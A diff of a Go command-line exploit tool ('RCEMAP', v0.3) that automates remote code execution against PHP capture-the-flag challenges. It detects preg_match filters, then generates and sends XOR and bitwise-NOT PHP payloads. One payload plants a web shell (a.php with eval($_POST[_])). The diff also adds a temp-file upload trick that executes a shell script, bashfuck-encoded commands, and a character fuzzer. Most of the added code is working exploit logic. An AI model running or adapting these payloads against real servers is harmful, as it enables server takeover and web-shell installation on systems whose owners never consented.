@@ -1,10 +1,12 @@
 package main
 
 import (
+	"bytes"
 	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
+	"mime/multipart"
 	"net/http"
 	"net/url"
 	"os"
@@ -16,7 +18,7 @@ import (
 )
 
 var i string
-var c string
+var command string
 var v int
 var m string
 
@@ -184,7 +186,7 @@ func removeHTMLTags(html string) string {
 func target() string {
 
 	flag.StringVar(&i, "i", "", "参数点")
-	flag.StringVar(&c, "c", "", "命令")
+	flag.StringVar(&command, "c", "", "命令")
 	flag.IntVar(&v, "v", 7, "参数点")
 	flag.StringVar(&m, "m", "GET", "请求方式")
 	url := flag.String("u", "", "target url")
@@ -201,24 +203,26 @@ func target() string {
 // logo
 
 func Logo() {
-	Logo := ".----.  .---. .----..-.   .-.  .--.  .----.\n" +
-		"| {}  }/  ___}| {_  |  `.'  | / {} \\ | {}  }\n" +
-		"| .-. \\\\     }| {__ | |\\ /| |/  /\\  \\| .--'\n" +
-		"`-' `-' `---' `----'`-' ` `-'`-'  `-'`-'"
+	Logo := `
+	
+██████╗  ██████╗███████╗███╗   ███╗ █████╗ ██████╗ 
+██╔══██╗██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗
+██████╔╝██║     █████╗  ██╔████╔██║███████║██████╔╝
+██╔══██╗██║     ██╔══╝  ██║╚██╔╝██║██╔══██║██╔═══╝ 
+██║  ██║╚██████╗███████╗██║ ╚═╝ ██║██║  ██║██║     
+╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝      
+	`
 
-	Author := "\t\t   ___     ___     __ \n" +
-		"\t\t  / _ \\___<  /__  / /_\n" +
-		"\t\t / ___/ __/ / _ \\/ __/\n" +
-		"\t\t/_/  /_/ /_/_//_/\\__/"
-
-	fmt.Println("Author: \n" + Author + "\n")
-	fmt.Println(Logo)
+	fmt.Printf(Logo + "\n")
+	fmt.Printf("\033[32m Author: Pr1nt \033[39m\n")
+	fmt.Printf("\033[32m Version: v0.3 \033[39m\n")
 
 }
 
 //前面都是其他的函数，从此处开始为主要函数，也是需要经常修改的函数
 
 var cleanText string
+var guolv string
 
 func test(url string) {
 	var response *http.Response
@@ -229,20 +233,7 @@ func test(url string) {
 			fmt.Println("Error creating GET request:", err)
 			return
 		}
-	} else if m == "POST" {
-		req, err := http.NewRequest("POST", url, strings.NewReader(i))
-		if err != nil {
-			fmt.Println("Error creating POST request:", err)
-			return
-		}
-		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
-		client := &http.Client{}
-		response, err = client.Do(req)
-		if err != nil {
-			fmt.Println("Error sending POST request:", err)
-			return
-		}
 	} else {
 		fmt.Println("Invalid request method")
 		return
@@ -264,39 +255,80 @@ func test(url string) {
 	for _, line := range lines {
 		cleanText = removeHTMLTags(line)
 		if strings.Contains(cleanText, preg_match) {
+
 			fmt.Printf(inf+"发现过滤: %s\n", preg_match)
 			fmt.Printf(inf + "题目源码如下: \n" + cleanText + "\n")
 
 			// 使用正则表达式提取括号内的内容
-			re := regexp.MustCompile(`preg_match\('([^']+)'`)
+			re := regexp.MustCompile(`preg_match\("([^"]+)"`)
 			matches := re.FindStringSubmatch(cleanText)
 
-			// 输出过滤内容及括号内的匹配内容
-			fmt.Printf(inf+"发现过滤为: %s\n", preg_match+"("+matches[1]+")")
-			//标记了一处地点，这里后续需要写其他过滤的情况下的实现代码
-			//等待施工中
-			// 检查括号内的内容是否包含 a-z 或 0-9
-			re2 := regexp.MustCompile(`[a-z0-9]`)
+			if len(matches) > 1 {
+				guolv = matches[1]
+				fmt.Printf(inf+"发现过滤为: %s\n", guolv)
+			} else {
+				re = regexp.MustCompile(`preg_match\('([^']+)'`)
+				matches = re.FindStringSubmatch(cleanText)
+				if len(matches) > 1 {
+					guolv = matches[1]
+					fmt.Printf(inf+"发现过滤为: %s\n", guolv) // 输出过滤内容及括号内的匹配内容
+				} //草泥马的就你一次匹配不好使呗，那老子两次匹配就完了呗
 
-			if re2.MatchString(matches[1]) {
-				// 如果包含 a-z 或 0-9，则输出无数字字母
+			}
+
+			a_z := regexp.MustCompile(`a-z`)       // 匹配小写字母 a-z
+			zero_nine := regexp.MustCompile(`0-9`) // 匹配数字 0-9
+
+			if a_z.MatchString(guolv) || zero_nine.MatchString(guolv) { //其他情况等待施工中
+
+				//如果是无数字字母题目
 
 				fmt.Println(inf + "经典无数字字母RCE题目")
+
 				if strings.Contains(string(cleanText), "eval") {
 
-					fmt.Println(inf + "执行eval函数")
-					eval(url) //施工完毕
+					//eval环境下的无数字字母分好多种
+					if strings.Contains(guolv, "$") {
+
+						fmt.Println(inf + "执行eval函数")
+						fmt.Println(inf + "普通无数字字母需要利用$，这里被过滤了，只能使用进阶版")
+						if !strings.Contains(guolv, "(") || !strings.Contains(guolv, ")") || !strings.Contains(guolv, "~") || !strings.Contains(guolv, ";") {
+							v = 7
+							noshuzievaljinjie(url) //无数字字母进阶的eval两种版本施工完毕
+						} else if !strings.Contains(guolv, ".") || !strings.Contains(guolv, "/") || !strings.Contains(guolv, "?") || !strings.Contains(guolv, "[") || !strings.Contains(guolv, "-") || !strings.Contains(guolv, "@") || !strings.Contains(guolv, "]") {
+							v = 5
+							noshuzievaljinjie(url)
+						} else {
+							fmt.Println(WARNING + "老弟你全给过滤了我咋做啊")
+						}
+					} else {
+
+						fmt.Println(inf + "既然$没有被过滤，那么这里有自增异或两种方法")
+
+						if !strings.Contains(guolv, "^") || !strings.Contains(guolv, "$") || !strings.Contains(guolv, "(") || !strings.Contains(guolv, ")") || !strings.Contains(guolv, "'") || !strings.Contains(guolv, ".") || !strings.Contains(guolv, "_") || !strings.Contains(guolv, ";") || !strings.Contains(guolv, "[") || !strings.Contains(guolv, "]") {
+							fmt.Println(inf + "可以使用异或")
+							xor(url)
+						} else if !strings.Contains(guolv, "$") || !strings.Contains(guolv, "_") || !strings.Contains(guolv, "+") || !strings.Contains(guolv, ";") || !strings.Contains(guolv, ".") {
+
+							fmt.Println(inf + "可以使用自增")
+							zizeng(url) //等待施工
+						}
+
+					}
 
 				} else if strings.Contains(string(cleanText), "system") {
 
 					fmt.Println(inf + "执行system函数")
-					system(url) //施工完毕
+					noshuzisystem(url) //无数字字母的system不分版本施工完毕
 
 				} else {
 					fmt.Println(WARNING + "这是什么题目QAQ")
 					os.Exit(0) //看不懂题目，自动退出
 				}
 
+			} else {
+				break
+				//其他过滤情况，需要使用fuzz
 			}
 
 			found = true
@@ -306,35 +338,100 @@ func test(url string) {
 			//replace过滤
 			fmt.Printf(inf+"发现过滤: %s\n", preg_replace)
 			fmt.Printf(inf + "题目源码如下: \n" + cleanText + "\n")
-			re := regexp.MustCompile(`preg_replace\('([^']+)'`)
+			re := regexp.MustCompile(`(?i)preg_replace\("([^"]+)"`)
 			matches := re.FindStringSubmatch(cleanText)
 
-			// 输出过滤内容及括号内的匹配内容
-			fmt.Printf(inf+"发现过滤为: %s\n", preg_replace+"("+matches[1]+")")
+			if len(matches) > 1 {
+				guolv = matches[1]
+				fmt.Printf(inf+"发现过滤为: %s\n", guolv)
+			} else {
+				re = regexp.MustCompile(`preg_replace\('([^']+)'`)
+				matches = re.FindStringSubmatch(cleanText)
+				if len(matches) > 1 {
+					guolv = matches[1]
+					fmt.Printf(inf+"发现过滤为: %s\n", guolv)
+				}
+
+			}
+			found = true
+			break
 			//等待施工中
+
 		}
 
 	}
 
 	if !found {
 		fmt.Println(WARNING + "未发现过滤")
-		fuzz(url) //等待施工中
+		fuzz(url)
+		//等待施工中
 	}
 
 }
 
-func eval(url string) {
+func zizeng(URL string) {
+
+}
+func xor(URL string) {
+	var newURL string
+	var payload string
+	if v == 5 {
+		newURL = URL + "?" + i + "=" + "$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);"
+		fmt.Printf(inf+"POC为: %s\n", newURL)
+		fmt.Printf("\033[33m" + "[Tips] " + "\033[39m" + "请注意,这里的command应该是如phpinfo();这样格式的\n")
+		payload = "_=" + command
+	} else if v == 7 {
+		newURL = URL + "?" + i + "=" + "$_=('%06'^'`').('%09'^'`').('%0c'^'`').('%05'^'`').'_'.('%10'^'`').('%15'^'`').('%14'^'`').'_'.('%03'^'`').('%0f'^'`').('%0e'^'`').('%14'^'`').('%05'^'`').('%0e'^'`').('%14'^'`').('%13'^'`');$__=('%01'^'`').'.'.('%10'^'`').('%08'^'`').('%10'^'`');$___='<?'.('%10'^'`').('%08'^'`').('%10'^'`').' '.('%05'^'`').('%16'^'`').('%01'^'`').('%0c'^'`').'($_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']').'[_]);?>';$____=$_($__,$___);"
+		fmt.Printf(inf+"POC为: %s\n", newURL)
+		fmt.Printf("\033[33m" + " [Tips] " + "\033[39m" + "请注意,这里的command应该是如phpinfo();这样格式的\n")
+		http.Get(newURL)
+		newURL = URL + "/../a.php" //生成并访问a.php,a.php代码为<?php eval($_POST[_]);?>
+		payload = "_=" + command
+	}
+
+	client := &http.Client{}
+
+	// 创建一个 POST 请求
+	request, err := http.NewRequest("POST", newURL, strings.NewReader(payload))
+	if err != nil {
+		fmt.Println("创建请求时发生错误:", err)
+		return
+	}
+
+	// 设置 Content-Type 头部
+	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	// 发送请求
+	response, err := client.Do(request)
+	if err != nil {
+		fmt.Println(WARNING+"发送请求时发生错误:", err)
+		return
+	}
+	defer response.Body.Close()
+
+	// 读取响应数据
+	body, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		fmt.Println(WARNING+"读取响应时发生错误:", err)
+		return
+	}
+
+	// 打印响应结果
+	fmt.Println(inf+"回显为:", removeHTMLTags(string(body)))
+}
+
+func noshuzievaljinjie(url string) {
 	var c1 string
 	var c2 string
-	leftIndex := strings.Index(c, "(")
+	leftIndex := strings.Index(command, "(")
 	if leftIndex == -1 {
 		// 字符串中没有左括号
-		c1 = c
+		c1 = command
 		c2 = ""
 	}
 
 	// 查找第一个右括号的索引
-	rightIndex := strings.Index(c, ")")
+	rightIndex := strings.Index(command, ")")
 	if rightIndex == -1 {
 		// 字符串中没有右括号
 		c1 = ""
@@ -343,8 +440,8 @@ func eval(url string) {
 	var c3 string
 	if leftIndex < rightIndex {
 		// 括号正确匹配，提取括号内外的内容
-		c1 = c[:leftIndex]
-		c2 = c[leftIndex+1 : rightIndex]
+		c1 = command[:leftIndex]
+		c2 = command[leftIndex+1 : rightIndex]
 
 		c2 = qufan(c2)
 
@@ -352,42 +449,101 @@ func eval(url string) {
 
 	} else {
 		// 括号不正确匹配
-		c1 = c
+		c1 = command
 		c2 = ""
 	}
-
+	var rec string
 	if v == 7 {
 		fmt.Println(inf + "PHP版本为7.x")
 
 		POC := qufan(c1)
 
-		c = "(~" + POC + ")(" + c3 + ");"
-		fmt.Printf(inf+"POC为: %s\n", c)
+		command = "(~" + POC + ")(" + c3 + ");"
+		fmt.Printf(inf+"POC为: %s\n", command)
 
 	} else if v == 5 {
 		fmt.Println(inf + "PHP版本为5.x")
-		c = "?><?=`. /???/????????[@-[]`;?>" //php5.x部分的无数字字母进阶版暂时未施工完毕，因为需要上传文件，而且需要检测是否对这几个字符有过滤（感觉不用检测，有过滤的做不出来了）
-
+		rec = "?><?=`. /???/????????[@-[]`;?>"
+		m = "POST"
 	}
-	res, err := http.Get(url + "?" + i + "=" + c)
-	if err != nil {
-		log.Fatal(err)
+
+	if m == "GET" {
+
+		res, err := http.Get(url + "?" + i + "=" + command)
+		if err != nil {
+			log.Fatal(err)
+		}
+		defer res.Body.Close()
+
+		body, err := ioutil.ReadAll(res.Body)
+
+		REres := removeHTMLTags(string(body))
+		fmt.Printf(inf+"回显为: %s \n", REres) //如果是GET方式就直接GET
+
+	} else if m == "POST" {
+		reurl := url + "?" + i + "=" + rec
+		fileContent := []byte("#!/bin/sh\n\n" + command)
+
+		body := &bytes.Buffer{}
+		writer := multipart.NewWriter(body)
+
+		// 创建一个文件字段，并将文件数据写入其中
+		fileField, err := writer.CreateFormFile("file", "1.txt")
+		if err != nil {
+			fmt.Println("创建表单文件字段失败:", err)
+			return
+		}
+		_, err = fileField.Write(fileContent)
+		if err != nil {
+			fmt.Println("写入文件数据失败:", err)
+			return
+		}
+
+		// 完成表单数据的写入
+		err = writer.Close()
+		if err != nil {
+			fmt.Println("关闭表单写入器失败:", err)
+			return
+		}
+		req, err := http.NewRequest("POST", reurl, body)
+		if err != nil {
+			fmt.Println("创建 POST 请求失败:", err)
+			return
+		}
+		req.Header.Set("Content-Type", writer.FormDataContentType())
+
+		// 发送请求
+		client := http.DefaultClient
+		resp, err := client.Do(req)
+		if err != nil {
+			fmt.Println("发送 POST 请求失败:", err)
+			return
+		}
+		defer resp.Body.Close()
+
+		// 读取响应
+		respBody, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			fmt.Println("读取响应失败:", err)
+			return
+		}
+
+		// 输出响应
+		fmt.Println("POST 请求响应:")
+		fmt.Println(string(respBody))
 	}
-	defer res.Body.Close()
-
-	body, err := ioutil.ReadAll(res.Body)
-
-	REres := removeHTMLTags(string(body))
-	fmt.Printf(inf+"回显为: %s \n", REres)
 
 }
 
 var char string
 
-func system(URL string) {
+func noshuzisystem(URL string) {
 	fmt.Printf(inf + "这是一个system命令，我们需要利用linux终端的一些特性来完成\n")
 	fmt.Printf(inf + "本函数基于探姬大佬的bashfuck工具进行二开，原项目地址：https://github.com/ProbiusOfficial/bashFuck\n")
 	char = fuzz(URL)
+	re := regexp.MustCompile("[" + guolv + "]")
+	char = re.ReplaceAllString(char, "")
+
 	var rec string
 	var req *http.Request
 	client := &http.Client{}
@@ -396,32 +552,33 @@ func system(URL string) {
 
 	if strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '1') && strings.ContainsRune(char, '2') && strings.ContainsRune(char, '3') && strings.ContainsRune(char, '4') && strings.ContainsRune(char, '5') && strings.ContainsRune(char, '6') && strings.ContainsRune(char, '7') && strings.ContainsRune(char, '\\') {
 
-		rec = CommonOtc(c)
+		rec = CommonOtc(command)
 		fmt.Printf(inf + "POC为: " + rec + "\n")
 
 	} else if strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '1') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') {
 
-		rec = BashfuckX(c, "bit")
+		rec = BashfuckX(command, "bit")
 		fmt.Printf(inf + "POC为: " + rec + "\n")
 
 	} else if strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') {
 
-		rec = BashfuckX(c, "zero")
+		rec = BashfuckX(command, "zero")
 		fmt.Printf(inf + "POC为: " + rec + "\n")
 
 	} else if strings.ContainsRune(char, '!') && strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') {
 
-		rec = BashfuckX(c, "c")
+		rec = BashfuckX(command, "c")
 		fmt.Printf(inf + "POC为: " + rec + "\n")
 
 	} else if strings.ContainsRune(char, '!') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '&') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '=') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') && strings.ContainsRune(char, '~') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '_') {
 
-		rec = BashfuckY(c)
+		rec = BashfuckY(command)
 		fmt.Printf(inf + "POC为: " + rec + "\n")
 
+	} else {
+		fmt.Println(WARNING + "bashfuck失灵了呜呜呜,你自己额外去想构造吧")
 	}
 
-	//需要当前目录下有个bashfuck包
 	newURL := fmt.Sprintf("%s?%s=%s", URL, i, url.QueryEscape(rec))
 
 	// 创建请求对象
@@ -432,12 +589,28 @@ func system(URL string) {
 
 		}
 	} else if m == "POST" {
-		req, err = http.NewRequest("POST", newURL, strings.NewReader(i))
-		if err != nil {
-			fmt.Println("Error creating POST request:", err)
 
+		payload := []byte(i + "=" + command)
+
+		// 发起 POST 请求
+		resp, err := http.Post(URL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
+		if err != nil {
+			fmt.Println("发送 POST 请求失败:", err)
+			return
 		}
-		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		defer resp.Body.Close()
+
+		// 读取响应
+		respBody, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			fmt.Println("读取响应失败:", err)
+			return
+		}
+
+		// 输出响应
+		fmt.Println("POST 请求响应:")
+		fmt.Println(string(respBody))
+
 	} else {
 		fmt.Println("无效请求方式")
 	}
@@ -460,8 +633,11 @@ func system(URL string) {
 }
 
 /*
+
 这是一个fuzz功能的函数，能够输出输入后的回显
+
 */
+
 func fuzz(URL string) string {
 	result := ""
 	fmt.Println(inf + "即将进行fuzz测试")
@@ -470,6 +646,7 @@ func fuzz(URL string) string {
 	var req *http.Request
 	var err error
 	var char string
+
 	for ch := 32; ch <= 126; ch++ {
 		char = fmt.Sprintf("%c", ch)
 
@@ -517,10 +694,11 @@ func fuzz(URL string) string {
 		cleanResponse = strings.TrimSpace(cleanResponse)
 
 		if cleanResponse == "" {
-			fmt.Printf(inf+"该字符可用: %s\n", char)
+			//fmt.Printf(inf+"该字符可用: %s\n", char)
 			result += char
 			continue
 		} else {
+			//fmt.Printf(WARNING+"该字符不可用: %s\n", char)
 			continue
 		}
 
